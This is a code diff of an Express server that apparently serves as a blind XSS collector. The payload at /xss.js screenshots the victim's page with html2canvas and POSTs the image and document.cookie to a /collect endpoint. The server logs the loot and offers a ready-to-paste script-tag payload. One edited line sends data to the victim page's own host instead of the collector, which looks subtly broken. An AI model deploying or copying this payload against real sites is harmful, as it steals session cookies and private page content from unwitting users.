@@ -21,14 +21,16 @@ app.use('/screenshots', express.static(screenshotDir));
 app.get('/xss.js', (req, res) => {
   res.setHeader('Content-Type', 'application/javascript');
   res.send(`
-    (function(){
+    (function () {
       var s = document.createElement('script');
       s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
-      s.onload = function() {
-        html2canvas(document.body).then(function(canvas) {
-          fetch('https://${req.headers.host}/collect', {
+      s.onload = function () {
+        html2canvas(document.body).then(function (canvas) {
+          fetch('https://' + location.host + '/collect', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+              'Content-Type': 'application/json'
+            },
             body: JSON.stringify({
               screenshot: canvas.toDataURL('image/png'),
               cookies: document.cookie,
@@ -75,8 +77,8 @@ app.post('/collect', (req, res) => {
     screenshot: screenshotPath
   };
 
-  console.log("🚨 Blind XSS Triggered:", logEntry);
-  fs.appendFileSync('logs.txt', JSON.stringify(logEntry) + "\n");
+  console.log("🚨 Blind XSS Triggered from IP:", ip);
+  fs.appendFileSync('logs.txt', JSON.stringify(logEntry, null, 2) + "\n\n");
 
   res.status(200).send('OK');
 });
@@ -88,6 +90,7 @@ app.get('/', (req, res) => {
     <p>Use this payload:</p>
     <pre>&lt;script src="https://${req.headers.host}/xss.js"&gt;&lt;/script&gt;</pre>
     <p>Check logs at <a href="/view-logs">/view-logs</a></p>
+    <p>View screenshots at <a href="/screenshots/">/screenshots/</a></p>
   `);
 });
 
